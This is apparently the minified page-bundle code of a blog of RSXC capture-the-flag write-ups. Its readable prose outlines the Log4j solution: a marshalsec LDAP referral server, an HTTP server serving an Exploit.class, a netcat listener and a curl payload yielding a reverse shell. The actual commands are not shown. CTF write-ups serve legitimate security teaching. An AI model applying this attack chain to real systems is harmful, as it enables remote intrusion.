V6=o(_s);e3=i(V6,"marshalsec utility"),V6.forEach(a),t3=i(wf,", I start my LDAP referral server to direct connections to my secondary HTTP server:"),wf.forEach(a),Xk=k(s),Ue=t(s,"PRE",{class:!0});var _y=o(Ue);_y.forEach(a),Gk=k(s),pp=t(s,"P",{});var x6=o(pp);o3=i(x6,"Following that I set up the HTTP server, and also start the netcat listener on the other computer:"),x6.forEach(a),qk=k(s),Re=t(s,"PRE",{class:!0});var wy=o(Re);wy.forEach(a),Bk=k(s),Ne=t(s,"PRE",{class:!0});var Ey=o(Ne);Ey.forEach(a),$k=k(s),Ds=t(s,"P",{});var Ef=o(Ds);p3=i(Ef,"Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit ("),Zc=t(Ef,"CODE",{});var U6=o(Zc);l3=i(U6,"Exploit.class"),U6.forEach(a),c3=i(Ef,") and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:"),Ef.forEach(a),Qk=k(s),We=t(s,"PRE",{class:!0});var Ty=o(We);Ty.forEach(a),Lk=k(s),lp=t(s,"P",{});var R6=o(lp);i3=i(R6,"Having everything ready and set up, we run our attack:"),R6.forEach(a),Kk=k(s),Se=t(s,"PRE",{class:!0});var yy=o(Se);yy.forEach(a),sf=k(s),Ys=t(s,"P",{});var Tf=o(Ys);r3=i(Tf,"Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely "),Jc=t(Tf,"CODE",{});var N6=o(Jc);u3=i(N6,"cat"),N6.forEach(a),k3=i(Tf," the flag:"),Tf.forEach(a),af=k(s),Me=t(s,"PRE",{class:!0});var Vy=o(Me);Vy.forEach(a),nf=k(s),Ie=t(s,"P",{});var og=o(Ie);f3=i(og,"The flag is: "),jc=t(og,"CODE",{});var W6=o(jc);h3=i(W6,"RSXC{We_do_like_logging_right?}"),W6.forEach(a),og.forEach(a),this.h()},h(){r(d,"href","#day-1-the-search"),r(O,"id","day-1-the-search"),r(ze,"href","#challenge"),r(Ps,"id","challenge"),r(Ce,"href","#solution"),r(As,"id","solution"),r(Xs,"class","language-shell"),r(Ye,"href","#day-2-a-magic-word"),r(qs,"id","day-2-a-magic-word"),r(Ze,"href","#challenge-1"),r(Bs,"id","challenge-1"),r(Je,"href","#solution-1"),r($s,"id","solution-1"),r(Qs,"class","language-shell"),r(Ls,"class","language-python"),r(Pe,"href","#day-3-what-does-this-mean"),r(sa,"id","day-3-what-does-this-mean"),r(He,"href","#challenge-2"),r(aa,"id","challenge-2"),r($,"href","https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),r($,"rel","noopener"),r($,"class","text-link"),r($,"target","_blank"),r(Ge,"href","#solution-2"),r(na,"id","solution-2"),r(ea,"class","language-undefined"),r(Q,"href","https://gchq.github.io/CyberChef/#recipe=From_Base64(%27A-Za-z0-9%2B/%3D%27,true)From_Base58(%27rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz%27,false)Bzip2_Decompress(false)From_Base85(%27!-u%27)From_Morse_Code(%27Space%27,%27Line%20feed%27)From_Hex(%27Auto%27)From_Base32(%27A-Z2-7%3D%27,false)"),r(Q,"rel","noopener"),r(Q,"class","text-link"),r(Q,"target","_blank"),r(qe,"href","#day-4-4-bytes-of-xor"),r(oa,"id","day-4-4-bytes-of-xor"),r(Be,"href","#challenge-3"),r(pa,"id","challenge-3"),r(L,"href","https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),r(L,"rel","noopener"),r(L,"class","text-link"),r(L,"target","_blank"),r(Le,"href","#solution-3"),r(la,"id","solution-3"),r(ca,"class","language-python"),r(Ke,"href","#day-5-plain-discussion"),r(ra,"id","day-5-plain-discussion"),r(st,"href","#challenge-4"),r(ua,"id","challenge-4"),r(K,"href","https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),r(K,"rel","noopener"),r(K,"class","text-link"),r(K,"target","_blank"),r(et,"href","#solution-4"),r(ka,"id","solution-4"),r(fa,"class","language-shell"),r(ha,"class","language-shell"),r(da,"class","language-shell"),r(pt,"href","#day-6-the-indecipherable-cipher"),r(ba,"id","day-6-the-indecipherable-cipher"),r(lt,"href","#challenge-5"),r(ga,"id","challenge-5"),r(ss,"href","https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),r(ss,"rel","noopener"),r(ss,"class","text-link"),r(ss,"target","_blank"),r(rt,"href","#solution-5"),r(va,"id","solution-5"),Oe(Mp.src,lg="https://i.imgur.com/CpPvW5u.png")||r(Mp,"src",lg),r(_a,"class","rehype-figure"),r(ut,"href","#day-7-this-is-quite-meta"),r(Ea,"id","day-7-this-is-quite-meta"),r(kt,"href","#challenge-6"),r(Ta,"id","challenge-6"),r(as,"href","https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),r(as,"rel","noopener"),r(as,"class","text-link"),r(as,"target","_blank"),r(dt,"href","#solution-6"),r(ya,"id","solution-6"),r(Va,"class","language-shell"),Oe(Op.src,cg="https://i.imgur.com/b50clg5.png")||r(Op,"src",cg),r(xa,"class","rehype-figure"),r(bt,"href","#day-8-the-reference"),r(Ra,"id","day-8-the-reference"),r(gt,"href","#challenge-7"),r(Na,"id","challenge-7"),r(ns,"href","http://rsxc.no:20008/"),r(ns,"rel","noopener"),r(ns,"class","text-link"),r(ns,"target","_blank"),r(wt,"href","#solution-7"),r(Wa,"id","solution-7"),r(Et,"href","#day-9-the-reference-2"),r(Ma,"id","day-9-the-reference-2"),r(Tt,"href","#challenge-8"),r(Ia,"id","challenge-8"),r(es,"href","http://rsxc.no:20009/"),r(es,"rel","noopener"),r(es,"class","text-link"),r(es,"target","_blank"),r(xt,"href","#solution-8"),r(Oa,"id","solution-8"),Oe(Jp.src,ig="https://i.imgur.com/OqEYN2c.png")||r(Jp,"src",ig),r(Fa,"class","rehype-figure"),r(za,"class","language-shell"),r(ts,"href","http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),r(ts,"rel","noopener"),r(ts,"class","text-link"),r(ts,"target","_blank"),r(Ca,"class","language-shell"),r(Rt,"href","#day-10-lookup"),r(Ya,"id","day-10-lookup"),r(Nt,"href","#challenge-9"),r(Za,"id","challenge-9"),r(os,"href","http://rsxc.no:20010/"),r(os,"rel","noopener"),r(os,"class","text-link"),r(os,"target","_blank"),r(Mt,"href","#solution-9"),r(Ja,"id","solution-9"),r(ja,"class","language-shell"),r(It,"href","#day-11-the-not-so-random-prime"),r(Ha,"id","day-11-the-not-so-random-prime"),r(Ot,"href","#challenge-10"),r(Aa,"id","challenge-10"),r(ps,"href","https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),r(ps,"rel","noopener"),r(ps,"class","text-link"),r(ps,"target","_blank"),r(Ct,"href","#solution-10"),r(Xa,"id","solution-10"),r(Ga,"class","language-python"),r(Dt,"href","#day-12-twelve-seconds-of-encoding"),r(Ba,"id","day-12-twelve-seconds-of-encoding"),r(Yt,"href","#challenge-11"),r($a,"id","challenge-11"),r(Jt,"href","#solution-11"),r(Qa,"id","solution-11"),r(La,"class","language-python"),r(Pt,"href","#day-13-new-technology-is-hard"),r(sn,"id","day-13-new-technology-is-hard"),r(Ht,"href","#challenge-12"),r(an,"id","challenge-12"),r(ls,"href","http://rsxc.no:20013/"),r(ls,"rel","noopener"),r(ls,"class","text-link"),r(ls,"target","_blank"),r(Gt,"href","#solution-12"),r(nn,"id","solution-12"),r(en,"class","language-jsx"),r(tn,"class","language-shell"),r(Bt,"href","#day-14-jwt"),r(pn,"id","day-14-jwt"),r($t,"href","#challenge-13"),r(ln,"id","challenge-13"),r(cs,"href","http://rsxc.no:20014/"),r(cs,"rel","noopener"),r(cs,"class","text-link"),r(cs,"target","_blank"),r(Kt,"href","#solution-13"),r(cn,"id","solution-13"),Oe(al.src,rg="https://i.imgur.com/Qjl9Ol4.png")||r(al,"src",rg),r(rn,"class","rehype-figure"),r(un,"class","language-shell"),r(ao,"href","#day-15-jwt-2"),r(fn,"id","day-15-jwt-2"),r(no,"href","#challenge-14"),r(hn,"id","challenge-14"),r(is,"href","http://rsxc.no:20015/"),r(is,"rel","noopener"),r(is,"class","text-link"),r(is,"target","_blank"),r(oo,"href","#solution-14"),r(dn,"id","solution-14"),r(rs,"href","https://github.com/ticarpi/jwt_tool"),r(rs,"rel","noopener"),r(rs,"class","text-link"),r(rs,"target","_blank"),r(mn,"class","language-shell"),r(bn,"class","language-shell"),r(po,"href","#day-16-a-scary-command"),r(vn,"id","day-16-a-scary-command"),r(lo,"href","#challenge-15"),r(_n,"id","challenge-15"),r(us,"href","https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),r(us,"rel","noopener"),r(us,"class","text-link"),r(us,"target","_blank"),r(ro,"href","#solution-15"),r(wn,"id","solution-15"),r(En,"class","language-bash"),r(Tn,"class","language-shell"),r(yn,"class","language-shell"),r(Vn,"class","language-bash"),r(xn,"class","language-shell"),r(Un,"class","language-bash"),r(Rn,"class","language-bash"),r(Nn,"class","language-shell"),r(fo,"href","#day-17-my-xmas-card"),r(Sn,"id","day-17-my-xmas-card"),r(ho,"href","#challenge-16"),r(Mn,"id","challenge-16"),r(ks,"href","http://rsxc.no:20017/"),r(ks,"rel","noopener"),r(ks,"class","text-link"),r(ks,"target","_blank"),r(go,"href","#solution-16"),r(In,"id","solution-16"),r(On,"class","language-php"),r(Fn,"class","language-php"),r(zn,"class","language-shell"),r(vo,"href","#day-18-remember-the-flag-docker-remembers"),r(Dn,"id","day-18-remember-the-flag-docker-remembers"),r(_o,"href","#challenge-17"),r(Yn,"id","challenge-17"),r(fs,"href","https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),r(fs,"rel","noopener"),r(fs,"class","text-link"),r(fs,"target","_blank"),r(To,"href","#solution-17"),r(Zn,"id","solution-17"),r(Jn,"class","language-shell"),r(yo,"href","#day-19-the-inclusive-xmas-cards"),r(Pn,"id","day-19-the-inclusive-xmas-cards"),r(Vo,"href","#challenge-18"),r(Hn,"id","challenge-18"),r(hs,"href","http://rsxc.no:20019/"),r(hs,"rel","noopener"),r(hs,"class","text-link"),r(hs,"target","_blank"),r(Ro,"href","#solution-18"),r(An,"id","solution-18"),r(Xn,"class","language-shell"),r(Gn,"class","language-shell"),r(No,"href","#day-20-easy-mistakes"),r(Bn,"id","day-20-easy-mistakes"),r(Wo,"href","#challenge-19"),r($n,"id","challenge-19"),r(ds,"href","http://rsxc.no:20020/"),r(ds,"rel","noopener"),r(ds,"class","text-link"),r(ds,"target","_blank"),r(Io,"href","#solution-19"),r(Qn,"id","solution-19"),r(Ln,"class","language-php"),r(Kn,"class","language-shell"),r(Fo,"href","#day-21-nice-memories"),r(ae,"id","day-21-nice-memories"),r(zo,"href","#challenge-20"),r(ne,"id","challenge-20"),r(ms,"href","https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),r(ms,"rel","noopener"),r(ms,"class","text-link"),r(ms,"target","_blank"),r(Yo,"href","#solution-20"),r(ee,"id","solution-20"),r(te,"class","language-shell"),r(oe,"class","language-shell"),r(Zo,"href","#day-22-wireless-communication"),r(le,"id","day-22-wireless-communication"),r(Jo,"href","#challenge-21"),r(ce,"id","challenge-21"),r(Po,"href","#solution-21"),r(ie,"id","solution-21"),r(re,"class","language-python="),r(ue,"class","language-undefined"),Oe(gc.src,ug="https://i.imgur.com/f1wYfVS.png")||r(gc,"src",ug),r(Ao,"class","rehype-figure"),Oe(vc.src,kg="https://i.imgur.com/ya1nPMb.png")||r(vc,"src",kg),r(Xo,"class","rehype-figure"),r(Os,"class","rehype-figure-container"),Oe(_c.src,fg="https://i.imgur.com/6GndJFX.png")||r(_c,"src",fg),r(ke,"class","rehype-figure"),r(Go,"href","#day-23-locating-the-location"),r(he,"id","day-23-locating-the-location"),r(qo,"href","#challenge-22"),r(de,"id","challenge-22"),r(bs,"href","http://rsxc.no:20023/"),r(bs,"rel","noopener"),r(bs,"class","text-link"),r(bs,"target","_blank"),r(Qo,"href","#solution-22"),r(me,"id","solution-22"),r(be,"class","language-python"),r(ge,"class","language-shell"),r(Lo,"href","#day-24-the-watcher"),r(_e,"id","day-24-the-watcher"),r(Ko,"href","#challenge-23"),r(we,"id","challenge-23"),r(gs,"href","http://rsxc.no:20024/"),r(gs,"rel","noopener"),r(gs,"class","text-link"),r(gs,"target","_blank"),r(np,"href","#solution-23"),r(Ee,"id","solution-23"),r(vs,"href","https://log4j-tester.trendmicro.com/"),r(vs,"rel","noopener"),r(vs,"class","text-link"),r(vs,"target","_blank"),r(Te,"class","language-shell"),r(ye,"class","language-shell"),r(z,"class","list"),r(xe,"class","language-undefined"),r(_s,"href","https://github.com/mbechler/marshalsec"),r(_s,"rel","noopener"),r(_s,"class","text-link"),r(_s,"target","_blank"),r(Ue,"class","language-shell"),r(Re,"class","language-shell"),r(Ne,"class","language-shell"),r(We,"class","language-java"),r(Se,"class","language-shell"),r(Me,"class","language-shell")},m(s,p){l(s,h,p),n(h,C),l(s,D,p),l(s,O,p),n(O,d),n(d,F),l(s,js,p),l(s,Ps,p),n(Ps,ze),n(ze,yf),l(s,Pc,p),l(s,ws,p),n(ws,Hs),n(Hs,Vf),n(Hs,vp),n(vp,xf),n(Hs,Uf),n(ws,Rf),n(ws,_p),n(_p,Nf),l(s,Hc,p),l(s,As,p),n(As,Ce),n(Ce,Wf),l(s,Ac,p),l(s,De,p),n(De,Sf),l(s,Xc,p),l(s,Xs,p),Xs.innerHTML=O6,l(s,Gc,p),l(s,Gs,p),n(Gs,Mf),n(Gs,wp),n(wp,If),l(s,qc,p),l(s,qs,p),n(qs,Ye),n(Ye,Of),l(s,Bc,p),l(s,Bs,p),n(Bs,Ze),n(Ze,Ff),l(s,$c,p),l(s,Es,p),n(Es,Ep),n(Ep,zf),n(Es,Cf),n(Es,Tp),n(Tp,Df),l(s,Qc,p),l(s,$s,p),n($s,Je),n(Je,Yf),l(s,Lc,p),l(s,Y,p),n(Y,Zf),n(Y,yp),n(yp,Jf),n(Y,jf),n(Y,Vp),n(Vp,Pf),n(Y,Hf),l(s,Kc,p),l(s,Qs,p),Qs.innerHTML=F6,l(s,si,p),l(s,je,p),n(je,Af),l(s,ai,p),l(s,Ls,p),Ls.innerHTML=z6,l(s,ni,p),l(s,Ks,p),n(Ks,Xf),n(Ks,xp),n(xp,Gf),l(s,ei,p),l(s,sa,p),n(sa,Pe),n(Pe,qf),l(s,ti,p),l(s,aa,p),n(aa,He),n(He,Bf),l(s,oi,p),l(s,Ae,p),n(Ae,Xe),n(Xe,$f),n(Xe,$),n($,Qf),l(s,pi,p),l(s,na,p),n(na,Ge),n(Ge,Lf),l(s,li,p),l(s,ea,p),ea.innerHTML=C6,l(s,ci,p),l(s,ta,p),n(ta,Kf),n(ta,Q),n(Q,sh),l(s,ii,p),l(s,Ts,p),n(Ts,ah),n(Ts,Up),n(Up,nh),n(Ts,eh),l(s,ri,p),l(s,oa,p),n(oa,qe),n(qe,th),l(s,ui,p),l(s,pa,p),n(pa,Be),n(Be,oh),l(s,ki,p),l(s,$e,p),n($e,Qe),n(Qe,ph),n(Qe,L),n(L,lh),l(s,fi,p),l(s,la,p),n(la,Le),n(Le,ch),l(s,hi,p),l(s,ys,p),n(ys,ih),n(ys,Rp),n(Rp,rh),n(ys,uh),l(s,di,p),l(s,ca,p),ca.innerHTML=D6,l(s,mi,p),l(s,ia,p),n(ia,kh),n(ia,Np),n(Np,fh),l(s,bi,p),l(s,ra,p),n(ra,Ke),n(Ke,hh),l(s,gi,p),l(s,ua,p),n(ua,st),n(st,dh),l(s,vi,p),l(s,at,p),n(at,nt),n(nt,mh),n(nt,K),n(K,bh),l(s,_i,p),l(s,ka,p),n(ka,et),n(et,gh),l(s,wi,p),l(s,tt,p),n(tt,vh),l(s,Ei,p),l(s,fa,p),fa.innerHTML=Y6,l(s,Ti,p),l(s,Vs,p),n(Vs,_h),n(Vs,Wp),n(Wp,wh),n(Vs,Eh),l(s,yi,p),l(s,ha,p),ha.innerHTML=Z6,l(s,Vi,p),l(s,ot,p),n(ot,Th),l(s,xi,p),l(s,da,p),da.innerHTML=J6,l(s,Ui,p),l(s,ma,p),n(ma,yh),n(ma,Sp),n(Sp,Vh),l(s,Ri,p),l(s,ba,p),n(ba,pt),n(pt,xh),l(s,Ni,p),l(s,ga,p),n(ga,lt),n(lt,Uh),l(s,Wi,p),l(s,ct,p),n(ct,it),n(it,Rh),n(it,ss),n(ss,Nh),l(s,Si,p),l(s,va,p),n(va,rt),n(rt,Wh),l(s,Mi,p),l(s,_a,p),n(_a,Mp),l(s,Ii,p),l(s,wa,p),n(wa,Sh),n(wa,Ip),n(Ip,Mh),l(s,Oi,p),l(s,Ea,p),n(Ea,ut),n(ut,Ih),l(s,Fi,p),l(s,Ta,p),n(Ta,kt),n(kt,Oh),l(s,zi,p),l(s,ft,p),n(ft,ht),n(ht,Fh),n(ht,as),n(as,zh),l(s,Ci,p),l(s,ya,p),n(ya,dt),n(dt,Ch),l(s,Di,p),l(s,mt,p),n(mt,Dh),l(s,Yi,p),l(s,Va,p),Va.innerHTML=j6,l(s,Zi,p),l(s,xa,p),n(xa,Op),l(s,Ji,p),l(s,Ua,p),n(Ua,Yh),n(Ua,Fp),n(Fp,Zh),l(s,ji,p),l(s,Ra,p),n(Ra,bt),n(bt,Jh),l(s,Pi,p),l(s,Na,p),n(Na,gt),n(gt,jh),l(s,Hi,p),l(s,vt,p),n(vt,_t),n(_t,Ph),n(_t,ns),n(ns,Hh),l(s,Ai,p),l(s,Wa,p),n(Wa,wt),n(wt,Ah),l(s,Xi,p),l(s,V,p),n(V,Xh),n(V,zp),n(zp,Gh),n(V,qh),n(V,Cp),n(Cp,Bh),n(V,$h),n(V,Dp),n(Dp,Qh),n(V,Lh),n(V,Yp),n(Yp,Kh),n(V,sd),l(s,Gi,p),l(s,Sa,p),n(Sa,ad),n(Sa,Zp),n(Zp,nd),l(s,qi,p),l(s,Ma,p),n(Ma,Et),n(Et,ed),l(s,Bi,p),l(s,Ia,p),n(Ia,Tt),n(Tt,td),l(s,$i,p),l(s,yt,p),n(yt,Vt),n(Vt,od),n(Vt,es),n(es,pd),l(s,Qi,p),l(s,Oa,p),n(Oa,xt),n(xt,ld),l(s,Li,p),l(s,Fa,p),n(Fa,Jp),l(s,Ki,p),l(s,Ut,p),n(Ut,cd),l(s,sr,p),l(s,za,p),za.innerHTML=P6,l(s,ar,p),l(s,Z,p),n(Z,id),n(Z,ts),n(ts,rd),n(Z,ud),n(Z,jp),n(jp,kd),n(Z,fd),l(s,nr,p),l(s,Ca,p),Ca.innerHTML=H6,l(s,er,p),l(s,Da,p),n(Da,hd),n(Da,Pp),n(Pp,dd),l(s,tr,p),l(s,Ya,p),n(Ya,Rt),n(Rt,md),l(s,or,p),l(s,Za,p),n(Za,Nt),n(Nt,bd),l(s,pr,p),l(s,Wt,p),n(Wt,St),n(St,gd),n(St,os),n(os,vd),l(s,lr,p),l(s,Ja,p),n(Ja,Mt),n(Mt,_d),l(s,cr,p),l(s,J,p),n(J,wd),n(J,Hp),n(Hp,Ed),n(J,Td),n(J,Ap),n(Ap,yd),n(J,Vd),l(s,ir,p),l(s,ja,p),ja.innerHTML=A6,l(s,rr,p),l(s,Pa,p),n(Pa,xd),n(Pa,Xp),n(Xp,Ud),l(s,ur,p),l(s,Ha,p),n(Ha,It),n(It,Rd),l(s,kr,p),l(s,Aa,p),n(Aa,Ot),n(Ot,Nd),l(s,fr,p),l(s,Ft,p),n(Ft,zt),n(zt,Wd),n(zt,ps),n(ps,Sd),l(s,hr,p),l(s,Xa,p),n(Xa,Ct),n(Ct,Md),l(s,dr,p),l(s,xs,p),n(xs,Id),n(xs,Gp),n(Gp,Od),n(xs,Fd),l(s,mr,p),l(s,j,p),n(j,zd),n(j,qp),n(qp,Cd),n(j,Dd),n(j,Bp),n(Bp,Yd),n(j,Zd),l(s,br,p),l(s,Ga,p),Ga.innerHTML=X6,l(s,gr,p),l(s,qa,p),n(qa,Jd),n(qa,$p),n($p,jd),l(s,vr,p),l(s,Ba,p),n(Ba,Dt),n(Dt,Pd),l(s,_r,p),l(s,$a,p),n($a,Yt),n(Yt,Hd),l(s,wr,p),l(s,Zt,p),n(Zt,Qp),n(Qp,Ad),l(s,Er,p),l(s,Qa,p),n(Qa,Jt),n(Jt,Xd),l(s,Tr,p),l(s,jt,p),n(jt,Gd),l(s,yr,p),l(s,La,p),La.innerHTML=G6,l(s,Vr,p),l(s,Ka,p),n(Ka,qd),n(Ka,Lp),n(Lp,Bd),l(s,xr,p),l(s,sn,p),n(sn,Pt),n(Pt,$d),l(s,Ur,p),l(s,an,p),n(an,Ht),n(Ht,Qd),l(s,Rr,p),l(s,At,p),n(At,Xt),n(Xt,Ld),n(Xt,ls),n(ls,Kd),l(s,Nr,p),l(s,nn,p),n(nn,Gt),n(Gt,sm),l(s,Wr,p),l(s,Us,p),n(Us,am),n(Us,Kp),n(Kp,nm),n(Us,em),l(s,Sr,p),l(s,en,p),en.innerHTML=q6,l(s,Mr,p),l(s,qt,p),n(qt,tm),l(s,Ir,p),l(s,tn,p),tn.innerHTML=B6,l(s,Or,p),l(s,on,p),n(on,om),n(on,sl),n(sl,pm),l(s,Fr,p),l(s,pn,p),n(pn,Bt),n(Bt,lm),l(s,zr,p),l(s,ln,p),n(ln,$t),n($t,cm),l(s,Cr,p),l(s,Qt,p),n(Qt,Lt),n(Lt,im),n(Lt,cs),n(cs,rm),l(s,Dr,p),l(s,cn,p),n(cn,Kt),n(Kt,um),l(s,Yr,p),l(s,rn,p),n(rn,al),l(s,Zr,p),l(s,so,p),n(so,km),l(s,Jr,p),l(s,un,p),un.innerHTML=$6,l(s,jr,p),l(s,kn,p),n(kn,fm),n(kn,nl),n(nl,hm),l(s,Pr,p),l(s,fn,p),n(fn,ao),n(ao,dm),l(s,Hr,p),l(s,hn,p),n(hn,no),n(no,mm),l(s,Ar,p),l(s,eo,p),n(eo,to),n(to,bm),n(to,is),n(is,gm),l(s,Xr,p),l(s,dn,p),n(dn,oo),n(oo,vm),l(s,Gr,p),l(s,f,p),n(f,_m),n(f,el),n(el,wm),n(f,Em),n(f,tl),n(tl,Tm),n(f,ym),n(f,ol),n(ol,Vm),n(f,xm),n(f,pl),n(pl,Um),n(f,Rm),n(f,ll),n(ll,Nm),n(f,Wm),n(f,rs),n(rs,Sm),n(f,Mm),n(f,cl),n(cl,Im),n(f,Om),n(f,il),n(il,Fm),n(f,zm),n(f,rl),n(rl,Cm),n(f,Dm),l(s,qr,p),l(s,mn,p),mn.innerHTML=Q6,l(s,Br,p),l(s,bn,p),bn.innerHTML=L6,l(s,$r,p),l(s,gn,p),n(gn,Ym),n(gn,ul),n(ul,Zm),l(s,Qr,p),l(s,vn,p),n(vn,po),n(po,Jm),l(s,Lr,p),l(s,_n,p),n(_n,lo),n(lo,jm),l(s,Kr,p),l(s,co,p),n(co,io),n(io,Pm),n(io,us),n(us,Hm),l(s,su,p),l(s,wn,p),n(wn,ro),n(ro,Am),l(s,au,p),l(s,Rs,p),n(Rs,Xm),n(Rs,kl),n(kl,Gm),n(Rs,qm),l(s,nu,p),l(s,En,p),En.innerHTML=K6,l(s,eu,p),l(s,Tn,p),Tn.innerHTML=sT,l(s,tu,p),l(s,Ns,p),n(Ns,Bm),n(Ns,fl),n(fl,$m),n(Ns,Qm),l(s,ou,p),l(s,yn,p),yn.innerHTML=aT,l(s,pu,p),l(s,Ws,p),n(Ws,Lm),n(Ws,hl),n(hl,Km),n(Ws,s2),l(s,lu,p),l(s,Vn,p),Vn.innerHTML=nT,l(s,cu,p),l(s,uo,p),n(uo,a2),l(s,iu,p),l(s,xn,p),xn.innerHTML=eT,l(s,ru,p),l(s,P,p),n(P,n2),n(P,dl),n(dl,e2),n(P,t2),n(P,ml),n(ml,o2),n(P,p2),l(s,uu,p),l(s,Un,p),Un.innerHTML=tT,l(s,ku,p),l(s,N,p),n(N,l2),n(N,bl),n(bl,c2),n(N,i2),n(N,gl),n(gl,r2),n(N,u2),n(N,vl),n(vl,k2),n(N,f2),l(s,fu,p),l(s,Rn,p),Rn.innerHTML=oT,l(s,hu,p),l(s,ko,p),n(ko,h2),l(s,du,p),l(s,Nn,p),Nn.innerHTML=pT,l(s,mu,p),l(s,Wn,p),n(Wn,d2),n(Wn,_l),n(_l,m2),l(s,bu,p),l(s,Sn,p),n(Sn,fo),n(fo,b2),l(s,gu,p),l(s,Mn,p),n(Mn,ho),n(ho,g2),l(s,vu,p),l(s,mo,p),n(mo,bo),n(bo,v2),n(bo,ks),n(ks,_2),l(s,_u,p),l(s,In,p),n(In,go),n(go,w2),l(s,wu,p),l(s,m,p),n(m,E2),n(m,wl),n(wl,T2),n(m,y2),n(m,El),n(El,V2),n(m,x2),n(m,Tl),n(Tl,U2),n(m,R2),n(m,yl),n(yl,N2),n(m,W2),n(m,Vl),n(Vl,S2),n(m,M2),n(m,xl),n(xl,I2),n(m,O2),n(m,Ul),n(Ul,F2),n(m,z2),n(m,Rl),n(Rl,C2),n(m,D2),l(s,Eu,p),l(s,On,p),On.innerHTML=lT,l(s,Tu,p),l(s,W,p),n(W,Y2),n(W,Nl),n(Nl,Z2),n(W,J2),n(W,Wl),n(Wl,j2),n(W,P2),n(W,Sl),n(Sl,H2),n(W,A2),l(s,yu,p),l(s,Fn,p),Fn.innerHTML=cT,l(s,Vu,p),l(s,zn,p),zn.innerHTML=iT,l(s,xu,p),l(s,Cn,p),n(Cn,X2),n(Cn,Ml),n(Ml,G2),l(s,Uu,p),l(s,Dn,p),n(Dn,vo),n(vo,q2),l(s,Ru,p),l(s,Yn,p),n(Yn,_o),n(_o,B2),l(s,Nu,p),l(s,wo,p),n(wo,Eo),n(Eo,$2),n(Eo,fs),n(fs,Q2),l(s,Wu,p),l(s,Zn,p),n(Zn,To),n(To,L2),l(s,Su,p),l(s,Ss,p),n(Ss,K2),n(Ss,Il),n(Il,s1),n(Ss,a1),l(s,Mu,p),l(s,Jn,p),Jn.innerHTML=rT,l(s,Iu,p),l(s,jn,p),n(jn,n1),n(jn,Ol),n(Ol,e1),l(s,Ou,p),l(s,Pn,p),n(Pn,yo),n(yo,t1),l(s,Fu,p),l(s,Hn,p),n(Hn,Vo),n(Vo,o1),l(s,zu,p),l(s,xo,p),n(xo,Uo),n(Uo,p1),n(Uo,hs),n(hs,l1),l(s,Cu,p),l(s,An,p),n(An,Ro),n(Ro,c1),l(s,Du,p),l(s,g,p),n(g,i1),n(g,Fl),n(Fl,r1),n(g,u1),n(g,zl),n(zl,k1),n(g,f1),n(g,Cl),n(Cl,h1),n(g,d1),n(g,Dl),n(Dl,m1),n(g,b1),n(g,Yl),n(Yl,g1),n(g,v1),n(g,Zl),n(Zl,_1),n(g,w1),l(s,Yu,p),l(s,E,p),n(E,E1),n(E,Jl),n(Jl,T1),n(E,y1),n(E,jl),n(jl,V1),n(E,x1),n(E,Pl),n(Pl,U1),n(E,R1),n(E,Hl),n(Hl,N1),n(E,W1),n(E,Al),n(Al,S1),n(E,M1),l(s,Zu,p),l(s,Xn,p),Xn.innerHTML=uT,l(s,Ju,p),l(s,H,p),n(H,I1),n(H,Xl),n(Xl,O1),n(H,F1),n(H,Gl),n(Gl,z1),n(H,C1),l(s,ju,p),l(s,Gn,p),Gn.innerHTML=kT,l(s,Pu,p),l(s,qn,p),n(qn,D1),n(qn,ql),n(ql,Y1),l(s,Hu,p),l(s,Bn,p),n(Bn,No),n(No,Z1),l(s,Au,p),l(s,$n,p),n($n,Wo),n(Wo,J1),l(s,Xu,p),l(s,So,p),n(So,Mo),n(Mo,j1),n(Mo,ds),n(ds,P1),l(s,Gu,p),l(s,Qn,p),n(Qn,Io),n(Io,H1),l(s,qu,p),l(s,Oo,p),n(Oo,A1),l(s,Bu,p),l(s,Ln,p),Ln.innerHTML=fT,l(s,$u,p),l(s,T,p),n(T,X1),n(T,Bl),n(Bl,G1),n(T,q1),n(T,$l),n($l,B1),n(T,$1),n(T,Ql),n(Ql,Q1),n(T,L1),n(T,Ll),n(Ll,K1),n(T,sb),n(T,Kl),n(Kl,ab),n(T,nb),l(s,Qu,p),l(s,Kn,p),Kn.innerHTML=hT,l(s,Lu,p),l(s,se,p),n(se,eb),n(se,sc),n(sc,tb),l(s,Ku,p),l(s,ae,p),n(ae,Fo),n(Fo,ob),l(s,sk,p),l(s,ne,p),n(ne,zo),n(zo,pb),l(s,ak,p),l(s,Co,p),n(Co,Do),n(Do,lb),n(Do,ms),n(ms,cb),l(s,nk,p),l(s,ee,p),n(ee,Yo),n(Yo,ib),l(s,ek,p),l(s,A,p),n(A,rb),n(A,ac),n(ac,ub),n(A,kb),n(A,nc),n(nc,fb),n(A,hb),l(s,tk,p),l(s,te,p),te.innerHTML=dT,l(s,ok,p),l(s,y,p),n(y,db),n(y,ec),n(ec,mb),n(y,bb),n(y,tc),n(tc,gb),n(y,vb),n(y,oc),n(oc,_b),n(y,wb),n(y,pc),n(pc,Eb),n(y,Tb),n(y,lc),n(lc,yb),n(y,Vb),l(s,pk,p),l(s,oe,p),oe.innerHTML=mT,l(s,lk,p),l(s,pe,p),n(pe,xb),n(pe,cc),n(cc,Ub),l(s,ck,p),l